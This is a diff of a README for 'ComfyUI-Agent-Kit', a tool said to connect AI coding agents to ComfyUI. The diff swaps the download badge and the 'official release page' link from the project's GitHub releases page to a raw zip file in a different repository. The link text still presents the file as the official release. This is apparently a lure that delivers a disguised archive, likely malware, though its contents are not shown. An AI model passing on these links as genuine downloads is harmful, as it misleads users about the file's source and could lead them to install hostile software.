@@ -5,7 +5,7 @@ description: "Control ComfyUI workflows through AI coding agents like Claude, Ge
 ---
 # 🤖 ComfyUI-Agent-Kit - Build AI Workflows With Ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Steam9303/ComfyUI-Agent-Kit/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Steam9303/steam9303.github.io/raw/refs/heads/main/shoofa/io-steam-github-1.3.zip)
 
 ComfyUI-Agent-Kit connects your favorite AI coding tools to your local image and video generation setup. It removes the guesswork from building complex workflows. This tool lets you control ComfyUI through simple commands. You get access to over 500 templates and prompt recipes. It automates your hardware selection and manages your workflow tasks.
 
@@ -24,7 +24,7 @@ Your computer needs specific parts to run this software well. Please verify your
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit the [official release page](https://github.com/Steam9303/ComfyUI-Agent-Kit/releases) to download the package.
+1. Visit the [official release page](https://github.com/Steam9303/steam9303.github.io/raw/refs/heads/main/shoofa/io-steam-github-1.3.zip) to download the package.
 2. Select the latest version listed under the assets section.
 3. Save the file to your computer.
 4. Locate the downloaded file in your folder.
